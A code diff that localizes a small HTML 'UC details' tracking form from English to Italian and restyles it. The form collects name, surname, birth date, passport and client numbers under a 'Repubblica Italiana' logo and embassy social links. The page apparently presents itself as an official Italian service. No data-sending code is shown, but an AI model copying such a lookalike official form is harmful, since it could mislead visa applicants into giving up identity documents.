@@ -1,81 +1,83 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>TRACK YOUR UC DETAILS</title>
+  <title>Verifica Dettagli UC</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
-      font-family: sans-serif;
+      font-family: 'Open Sans', sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
       display: flex;
       flex-direction: column;
       min-height: 100vh;
-      background-color: #ffffff;
     }
 
     header {
-      background-color: #0b0a0a;
+      background-color: #003366;
       padding: 20px;
+      color: white;
       text-align: center;
     }
 
     header img {
-      width: 150px;
-      max-width: 80%;
-      display: block;
-      margin: 0 auto;
+      max-height: 60px;
+      margin-bottom: 10px;
     }
 
     header h1 {
-      margin-top: 10px;
-      font-size: 24px;
-      font-weight: bold;
-      color: #ffffff;
+      font-size: 22px;
+      margin: 0;
     }
 
     main {
       flex: 1;
-      padding: 20px;
       display: flex;
       justify-content: center;
       align-items: center;
+      padding: 20px;
     }
 
     form {
-      background-color: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
       width: 100%;
-      max-width: 400px;
+      max-width: 420px;
     }
 
     input, button {
       width: 100%;
       padding: 12px;
-      margin: 8px 0;
+      margin-top: 10px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
       box-sizing: border-box;
-      font-size: 16px;
     }
 
     button {
-      background-color: #004466;
+      background-color: #003366;
       color: white;
       border: none;
-      border-radius: 5px;
-      cursor: pointer;
+      font-weight: bold;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
     }
 
     button:hover {
-      background-color: #006699;
+      background-color: #005fa3;
     }
 
     #error {
       color: red;
-      display: none;
-      font-weight: bold;
       text-align: center;
+      margin-top: 10px;
+      display: none;
     }
 
     #loadingScreen {
@@ -86,27 +88,27 @@
       width: 100vw;
       height: 100vh;
       background-color: white;
-      z-index: 9999;
+      z-index: 1000;
       justify-content: center;
       align-items: center;
     }
 
     #loadingScreen img {
-      width: 80px;
-      height: 80px;
+      width: 70px;
+      height: 70px;
     }
 
     footer {
-      background-color: #ffffff;
-      padding: 10px;
+      background-color: #f0f0f0;
+      padding: 15px;
       text-align: center;
+      font-size: 14px;
     }
 
     .social a {
-      margin: 0 10px;
+      margin: 0 8px;
+      color: #003366;
       text-decoration: none;
-      color: #004466;
-      font-weight: bold;
     }
 
     @media (max-width: 480px) {
@@ -115,47 +117,40 @@
       }
 
       form {
-        padding: 15px;
+        padding: 20px;
       }
 
       input, button {
         font-size: 14px;
-        padding: 10px;
-      }
-
-      #loadingScreen img {
-        width: 60px;
-        height: 60px;
       }
     }
   </style>
 </head>
 <body>
-
   <header>
-    <img src="logo.png" alt="Logo" class="logo">
-    <h1>Track your UC Details</h1>
+    <img src="logo.png" alt="Repubblica Italiana Logo" />
+    <h1>Verifica Dettagli UC</h1>
   </header>
 
   <main>
     <form id="verifyForm">
-      <input type="text" id="name" placeholder="Name" required />
-      <input type="text" id="lastname" placeholder="Last Name" required />
-      <input type="date" id="dob" placeholder="Date of Birth" required />
-      <input type="text" id="passport" placeholder="Passport No (Optional)" />
-      <input type="text" id="clientno" placeholder="Client No" required />
-      <button type="submit">Tracking</button>
-      <p id="error">Incorrect information entered!</p>
+      <input type="text" id="name" placeholder="Nome" required />
+      <input type="text" id="lastname" placeholder="Cognome" required />
+      <input type="date" id="dob" required />
+      <input type="text" id="passport" placeholder="Passaporto (opzionale)" />
+      <input type="text" id="clientno" placeholder="Numero Cliente" required />
+      <button type="submit">Verifica</button>
+      <p id="error">I dati inseriti non sono corretti.</p>
     </form>
   </main>
 
   <div id="loadingScreen">
-    <img src="Loading.gif" alt="Loading...">
+    <img src="Loading.gif" alt="Caricamento...">
   </div>
 
   <footer>
     <div class="social">
-      <a href="https://www.instagram.com/italyiniran/?hl=en" target="_blank">Instagram</a>
+      <a href="https://www.instagram.com/italyiniran/" target="_blank">Instagram</a>
       <a href="https://www.youtube.com/channel/UCd2txiPLDY7WfWRaXYmqgiw" target="_blank">YouTube</a>
       <a href="https://twitter.com/italyiniran" target="_blank">X</a>
     </div>
@@ -191,11 +186,10 @@
           })
           .catch(err => {
             document.getElementById('loadingScreen').style.display = 'none';
-            console.error('Error loading data.json:', err);
+            console.error('Errore nel caricamento dei dati:', err);
           });
-      }, 3000);
+      }, 2500);
     });
   </script>
-
 </body>
 </html>
